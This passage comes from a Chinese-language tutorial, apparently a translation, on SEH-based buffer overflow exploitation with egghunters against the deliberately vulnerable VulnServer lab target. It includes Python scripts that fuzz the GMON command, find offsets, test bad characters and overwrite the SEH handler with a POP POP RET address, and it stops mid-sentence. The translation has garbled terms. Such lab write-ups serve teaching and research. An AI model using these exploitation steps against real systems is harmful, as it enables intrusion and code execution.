href="#1-1-4-漏洞" class="headerlink" title="1.1.4 漏洞"></a>1.1.4 漏洞</h3><p>因此，回顾一下，我们已经介绍了异常是什么，不同类型的处理程序，还讨论了<strong>结构化异常处理程序的</strong> <em>真正</em>工作原理，因此现在我们可能应该从攻击者的角度谈谈这一点以及我们如何利用这些<strong>异常处理程序。</strong>处理程序来获得对程序执行流程的控制，类似于<code>EIP Overwrite</code>第1部分中的内容。</p><p>现在在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">这里的</a>第1部分中-我们能够控制VulnServer和SLMail上的<em>执行流程</em>，从而也将它重定向到我们自己的<em>shellcode</em>并弹出一个反向shell，这当然是一个非常古老的漏洞，SEH应该解决此问题，但是一个非常糟糕的实现，很快就被利用了。</p><p>现在，我不想在这里展示一个疯狂的示例，因为我将在下面的“ <strong>示例”</strong>部分中进行介绍，但是这里的理论是我们不使用用户控制输入覆盖EIP，而是覆盖指向<strong>下一个SEH记录</strong>（即<strong>异常注册）</strong>的指针<strong>记录</strong>以及指向<strong>SE处理程序</strong>的指针，这些指针指向我们控制并可以放置shellcode的内存区域。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161651.png" class="lozad"></p><p>如您所见，我们没有像第1 部分那样覆盖<strong>EIP寄存器</strong>，<code>41414141</code>而是覆盖了<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针。现在，在开始讨论Egghunter以及进行<em>SEH溢出</em>时如何使用它们之前，我想快速向您展示与<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针相比，我们如何控制<strong>EIP寄存器</strong>。</p><p>我不会深入探讨细节，但是如果我们可以对永不重复的字符串进行<em>模糊处理</em>，然后计算偏移量，然后使用选择的数据覆盖<strong>SE Handler</strong>和<strong>SE Record</strong>，该偏移量可用于控制EIP。</p><p>在下面的示例中，我分析了偏移也是<strong>SE Record</strong>，<code>3519 Bytes</code>因此我在<strong>SE Record上</strong>加上了4 x B ，在<strong>SE Handler上</strong>加上了4 <strong>xC</strong>。查看下面的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;BBBB&quot; </span><br><span class="line">seh = &quot;CCCC&quot;</span><br><span class="line"></span><br><span class="line">buffer=&quot;A&quot; * 3515</span><br><span class="line">buffer += nseh</span><br><span class="line">buffer += seh</span><br><span class="line"></span><br><span class="line">junk = &quot;D&quot;*(4500-len(buffer))</span><br><span class="line">buffer += junk</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON&quot;</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">print &quot;[*] Finished Fuzzing Check SEH Chain on Immunity&quot;</span><br><span class="line">s.close()</span><br><span class="line">except:</span><br><span class="line">print &quot;couldn&apos;t connect to server&quot;</span><br></pre></td></tr></table></figure><p>现在，如果我们跳过<strong>Immunity</strong>并查看<strong>SEH链，</strong>我们将看到以下内容。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161702.png" class="lozad"></p><p>首先让我向您展示一些东西，当前应用程序处于崩溃状态（当然），但是我们仍然可以通过按<strong>Shift + F9</strong>将异常传递给程序-如果这样做，我们会注意到一些有趣的东西。</p><p><strong>SE Handler</strong>在堆栈上的值被压入<strong>EIP寄存器</strong> ，这当然不是很理想！现在，我们可以控制整个程序的执行流程。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162151.png" class="lozad"></p><h3 id="1-1-5-提及POP-POP-RET"><a href="#1-1-5-提及POP-POP-RET" class="headerlink" title="1.1.5 提及POP POP RET"></a>1.1.5 提及POP POP RET</h3><p>因此，如您在上面的屏幕截图/示例中所看到的，我们实际上生活在<strong>SE Handler</strong>的土地或区域中，由于空间的限制以及我们必须使用的存储区域的小巧性，我们实际上并不好当然，我们也许可以将Egghunters纳入其中，但我将在本文后面讨论。我想首先谈谈<code>POP POP RET</code>通常与<strong>SEH溢出</strong>结合使用的技术<strong>。</strong></p><h4 id="1-1-5-1-什么是POP-POP-RET？"><a href="#1-1-5-1-什么是POP-POP-RET？" class="headerlink" title="1.1.5.1 什么是POP POP RET？"></a><strong>1.1.5.1 什么是POP POP RET？</strong></h4><p>现在，实际上，<code>POP POP RET</code>我们将<strong>SE Handler</strong>值替换为一条<code>POP POP RET</code>指令的内存地址，这将听起来很真实，这将在技术上运行这些汇编指令，从而将我们<strong>引向nSEH。</strong></p><p>值得一提的是，<em>弹出</em>值转到的寄存器并不重要，我们只需要将<strong>ESP</strong> 的值上移<em>两次</em>，然后返回即可执行。因此<em>POP EAX</em>，<em>POP EBC，POP ECX</em>等都将适用，只要<code>RET</code>在两次<em>弹出</em>后有相关说明</p><h4 id="1-1-5-2-我们为什么要POP-POP-RET？"><a href="#1-1-5-2-我们为什么要POP-POP-RET？" class="headerlink" title="1.1.5.2 我们为什么要POP POP RET？"></a>1.1.5.2 我们为什么要POP POP RET？</h4><p>现在，如果您回想<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a> -一旦我们获得了对<strong>返回地址</strong>和<strong>EIP的</strong>控制，我们就找到了一条<strong>JMP ESP</strong>指令，以跳到我们的堆栈代码的顶部，在此我们的shell代码和NOP滑动，我们获得了代码执行权。现在，如果我们尝试向<strong>SE Handler中</strong>添加<strong>JMP ESP</strong>指令的内存位置，则Windows会自动将所有寄存器清零，以防止用户跳到那里的shellcode，但这确实是一个有缺陷的保护机制。</p><p>您实际上可以在下面的屏幕中看到<strong>ESI</strong>和<strong>EDI</strong>已被清零，以帮助减轻攻击者直接跳到Shellcode的风险。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162200.png" class="lozad"></p><p>现在就在这里<code>POP POP RET</code>，让我们首先记住一下<strong>SEH Record</strong>＆<strong>Handler</strong>在堆栈上的布局</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162211.png" class="lozad"></p><p>现在，让我们考虑一下<strong>POP POP RET</strong>在这里将执行的操作：<em>POP（向上移动4个字节）<em>，</em>POP（向上移动4个字节）<em>和</em>RET（简单返回，将地址发送给EIP作为下一条要执行的指令）</em> -现在我们有了完全控制权； ）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162219.png" class="lozad"></p><h4 id="1-1-5-3-查找POP-POP-RET模块和说明"><a href="#1-1-5-3-查找POP-POP-RET模块和说明" class="headerlink" title="1.1.5.3 查找POP POP RET模块和说明"></a>1.1.5.3 查找POP POP RET模块和说明</h4><p>现在，我不想在这里深入探讨如何找到适用的模块和说明，因为我将在示例部分中介绍它，但长话短说是<strong>mona</strong></p><p>与<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a>类似，我们大量使用了<strong>mona</strong>，在执行<strong>SEH溢出</strong>时也将使用它-我们要做的就是发出以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>这将自动在所有可用模块中搜索<code>POP POP RET</code>序列。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162234.png" class="lozad"></p><p>现在，就像漏洞利用一样，我们必须确保我们选择内存地址中具有0个错误字符的模块，并避免使用诸如<strong>SEEPSEH之类的*</strong>SEH防护措施*，我将在后面讨论。</p><hr><h2 id="1-2-彩蛋猎人101"><a href="#1-2-彩蛋猎人101" class="headerlink" title="1.2 彩蛋猎人101"></a>1.2 彩蛋猎人101</h2><h3 id="1-2-1-什么是彩蛋猎人？"><a href="#1-2-1-什么是彩蛋猎人？" class="headerlink" title="1.2.1 什么是彩蛋猎人？"></a>1.2.1 什么是彩蛋猎人？</h3><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><h3 id="1-2-2-彩蛋者如何工作？"><a href="#1-2-2-彩蛋者如何工作？" class="headerlink" title="1.2.2 彩蛋者如何工作？"></a>1.2.2 彩蛋者如何工作？</h3><p><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf</a></p><p>我想概述一下Egghunters在这里的工作方式，而无需深入了解，就像我上面已经说过的那样</p><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p><p>这听起来不错，但为什么不仅仅使用简单的<strong>Short JMP</strong>或<strong>JMP ESP</strong>跳转到我们的shellcode- 想象一下您有很少的空间可以使用，例如<strong>50字节</strong>。这没有足够的空间来放置一些shell代码，但是足以放置一个<strong>32字节的Egghunter</strong></p><p>假设我们可以将<strong>32字节的</strong> hunter放入堆栈/内存，并且能够将执行重定向到hunter的位置，我们可以告诉hunter在整个内存空间中搜索预定义的标签，例如<code>MOCH</code>，我们的shellcode将是直接放在此标签（又称<strong>鸡蛋）之后</strong></p><p>所以执行流程看起来像这样</p><ol><li>控制执行力</li><li>跳转到包含<strong>32字节Egghunter的</strong>小缓冲区空间</li><li>Egghunter执行并在所有内存中搜索<strong>预定义的鸡蛋</strong></li><li>Egghunter找到<strong>鸡蛋</strong>并执行放置<em>在</em> <strong>鸡蛋*</strong>之后的* shellcode</li></ol><h3 id="1-2-3-一个关于NTDisplayString的词"><a href="#1-2-3-一个关于NTDisplayString的词" class="headerlink" title="1.2.3 一个关于NTDisplayString的词"></a>1.2.3 一个关于NTDisplayString的词</h3><p>在本文中，我们将使用<strong>32字节</strong> Egghunter，它利用<code>NTDisplayString</code>显示为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI </span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"></span><br><span class="line">NtDisplayString(</span><br><span class="line"></span><br><span class="line">  IN PUNICODE_STRING      String );</span><br></pre></td></tr></table></figure><p>[参考] [<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]" target="_blank" rel="noopener">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]</a></p><p><code>NTDisplayString</code>实际上是在Windows中使用相同的系统调用来显示蓝屏，那么这如何在我们的<strong>Egghunter中</strong>发挥<strong>作用？</strong></p><p>好吧，我们滥用了以下事实：该系统调用用于验证地址范围，并且指针也被读取而不被写入。</p><p>这种方法有一个小的缺点，它的系统调用号<code>NTDisplayString</code>无法更改，而且多年来，系统调用号在Windows版本和体系结构上均已更改。</p><p>当我写这篇文章时，我实际上遇到了我的Egghunter出现的一些问题，<code>Access Violation reading: FFFFFF</code>即执行<code>INT 2E</code>系统调用时。原因？</p><p>因为我试图在Windows的64位系统上运行Egghunter，所以我有点愚蠢，但是由于该应用程序被编译为32位应用程序并且过去没有太多问题，因此我对此没有多加考虑。</p><p>Corelan出色地解释了Egghunter的每个组装指令的功能，因此请查看此处的文章<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/" target="_blank" rel="noopener">。</a></p><hr><h1 id="0x02-例子"><a href="#0x02-例子" class="headerlink" title="0x02 例子"></a>0x02 例子</h1><h2 id="2-1-带Egghunter的VulnServer"><a href="#2-1-带Egghunter的VulnServer" class="headerlink" title="2.1 带Egghunter的VulnServer"></a>2.1 带Egghunter的VulnServer</h2><p>在此示例中，我将介绍<strong>VulnServer</strong>，这是一个故意易受攻击的服务器，它在端口9999上侦听任何传入的连接，并支持多种类型的命令，如之前在第1部分中看到的。</p><h3 id="2-1-1-模糊和发现崩溃"><a href="#2-1-1-模糊和发现崩溃" class="headerlink" title="2.1.1 模糊和发现崩溃"></a>2.1.1 模糊和发现崩溃</h3><p>现在类似于<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分，</a>我不想演示如何模糊<strong>VulnServer</strong>上的每个可用命令。如果您正在寻找类似的内容，请检查我们的<strong>booFuzz，</strong>它非常酷。在这种情况下，我只打算模糊<code>GMON</code>命令以节省时间并专注于开发部分本身。</p><p>让我们使用以下脚本对该命令进行简单的模糊处理来开始它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer=[&quot;A&quot;]</span><br><span class="line">counter=100</span><br><span class="line"></span><br><span class="line">while len(buffer) &lt;= 30:</span><br><span class="line">buffer.append(&quot;A&quot;*counter)</span><br><span class="line">counter=counter+200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for string in buffer:</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + string))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(string)</span><br></pre></td></tr></table></figure><p>我们在这里所做的工作与第1部分中介绍的基本堆栈溢出非常相似，其中我们在进行以下操作</p><ol><li>在<strong>端口9999</strong>上连接到<strong>bof.local</strong></li><li>发送<code>GMON /.:/ + string += 200</code>-其中字符串=，<code>A</code>并按<code>200</code>每个周期递增。</li><li>关闭TCP连接</li></ol><p>一旦应用程序崩溃，脚本将开始运行，我们可以检查<strong>Immunity</strong>。</p><p>现在，当我们跳到Immunity时，我们可能会注意到一些有趣的东西，我注意到的第一件事就是<code>Access Violation when writing to [06500000]</code>Immunity的页脚，这是告诉我们该应用程序处于崩溃状态，并且实际上不知道下一步该<em>怎么做</em> -您可能还要注意，与包含第1部分的<strong>EIP</strong>值不同，它看起来很正常<code>41414141</code>-这是由于我们没有过度运行返回地址并获得对<strong>EIP寄存器的</strong>控制，而是超过了堆栈上的<strong>nSEH</strong>和<strong>SEH</strong>值。</p><p>让我们通过在Immunity中按下来建立<strong>SEH链</strong><code>ALT+S</code>。这样做之后，我们会注意到一些有趣的<code>41414141</code>输出，我们过去在<strong>EIP寄存器中</strong>看到的输出现在显示在<strong>SE Handler中</strong>。右键单击<code>41414141</code>并选择<code>Follow in Stack</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162251.png" class="lozad"></p><p>完美，我们现在可以使用用户提供的输入来覆盖指向<strong>nSEH</strong>和<strong>SEH</strong>的指针。现在，让我们找出必须提供多少用户提供的输入才能到达<strong>nSEH</strong>和<strong>SEH</strong>的指针</p><h3 id="2-1-2-寻找偏移"><a href="#2-1-2-寻找偏移" class="headerlink" title="2.1.2 寻找偏移"></a>2.1.2 寻找偏移</h3><p>在这里，我们再次找到偏移量，因为我确信您知道这是漏洞利用开发的非常普遍的部分，并且不仅适用于<strong>SEH Overlows-</strong>有几种不同的方法可以执行此<em>操作</em>，例如<em>手动</em>，<strong>metasploit</strong>和<strong>mona，</strong>但是由于偏爱，我会在这里坚持<strong>蒙娜丽莎</strong>。</p><p>首先，使用以下命令创建一个永不重复的字符串/循环模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 6000</span><br></pre></td></tr></table></figure><p>并将其与我们的模糊测试脚本结合在一起，但不必每次都重复A的增量200字节，我们只需将我们的模式与 <code>GMON :./</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with pattern containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，我们的应用程序将返回崩溃状态并报告a，<code>Access Violation</code>但是这次<strong>SE Handler</strong>包含<code>45336E45</code>的内容相比<code>41414141</code>-让我们再次跳转到堆栈并检查当前驻留在堆栈上的数据。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162302.png" class="lozad"></p><p>完善！如您所见，我们正在查看我们永不重复的字符串，并且无法仅通过在<strong>mona中</strong>使用以下命令之一来计算偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br><span class="line">!mona po 1En2</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162311.png" class="lozad"></p><p>如您所见，我们花了<strong>3515</strong> <strong>个字节</strong>来超出<strong>nSEH</strong>的值，而花了<strong>3519个字节</strong>来超过<strong>SE Handler</strong>的值-在我开始拼凑所有内容之前，我想首先花时间来查找任何不良字符。</p><h3 id="2-1-3-寻找坏字符"><a href="#2-1-3-寻找坏字符" class="headerlink" title="2.1.3 寻找坏字符"></a>2.1.3 寻找坏字符</h3><p>我不会在这里解释为什么我们需要找到坏字符，因为我在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分中</a>做了很好的工作，所以就去那里。</p><p>让我们使用下面的简单脚本，通过命令将每个可能的字符的字符串发送到<strong>VulnServer</strong><code>GMON</code>。当然，我们将<code>\x00</code>字符（即<strong>空字节）</strong>排除在外<strong>。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>现在，仅简要介绍我们在这里所做的事情</p><ol><li><p>计算不良字符的数量并从<code>3515</code>我们的<strong>偏移量</strong>减去该值</p></li><li><p>发送 <code>3260 A&#39;s + 255 bad chars</code></p></li><li><p>发送<code>BBBB</code>以覆盖<strong>nSEH</strong>值</p></li><li><p>发送<code>CCCC</code>以覆盖<strong>SEH</strong>值</p></li><li><p>填充剩余空间 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDDD...</span><br></pre></td></tr></table></figure><ol><li>我们这样做的原因是我们没有填充剩余空间，所以<strong>SEH</strong>不会触发</li></ol></li></ol><p>ps：由于<strong>SE处理程序</strong>（又称52字节）之后空间的限制，我决定在覆盖<strong>nSEH</strong>和<strong>SEH</strong>之前发送错误字符</p><p>检查内存转储，我们可以看到除了<strong>空字节</strong>又名，我们实际上有零个坏字符<code>\x00</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162322.png" class="lozad"></p><h3 id="2-1-4-查找POP-POP-RET指令"><a href="#2-1-4-查找POP-POP-RET指令" class="headerlink" title="2.1.4 查找POP POP RET指令"></a>2.1.4 查找POP POP RET指令</h3><p>我已经详细说明<code>POP POP RET</code>了指令的顺序及其重要性，因此我将坚持实用并让上面的部分<code>A Mention on POP POP RET</code>进行讨论。</p><p>首先让我们找到一个适用的模块，该模块将使用以下带有<strong>mona的</strong>命令包含此指令序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>在这里，一个明显的选择是突出的，<code>efffunc.dll</code>因为它没有使用任何安全机制（例如<code>SafeSEH</code> 或）进行编译<code>ASLR</code></p><p>让我们双击该模块，然后验证组装说明并确保这是我们所需要的。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162340.png" class="lozad"></p><p>完美，我们有<code>POP EBX</code> <code>POP EBP</code>和<code>RETN</code>指令。这正是我们所需要的<code>POP POP RET</code></p><p>对于这一部分，我建议您在<code>POP POP RET</code>函数的开头放置一个断点，以便您可以逐步进行下一部分以了解会发生什么，只需在<strong>mona中</strong>双击所选模块，然后按<code>F2</code>一下<code>POP EBX</code>说明即可。</p><p>现在，我将修改python脚本，以如下所示用指令<code>seh</code>的值覆盖变量<code>POP POP RET</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010b4 pop,pop,ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 3515</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>让我们运行此脚本，再次跳转到<strong>Immunity</strong>，看看发生了什么。</p><p>在我们检查堆栈或内存转储之前，让我们快速检查一下<strong>SEH链</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162401.png" class="lozad"></p><p>完美，<strong>SE处理</strong>程序指向<code>POP POP RET</code>我们所选DLL中的指令，在这种情况下<code>0x625010B4</code>-&gt;<code>essfunc.dll</code></p><p>快速分析堆栈和内存转储也都可以。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162409.png" class="lozad"></p><p>当然，因为我们只是在应用程序处于崩溃状态时将所有内容拼凑在一起，但是让我们将我们的异常传递给程序，通过该程序将堆栈上的<strong>SE 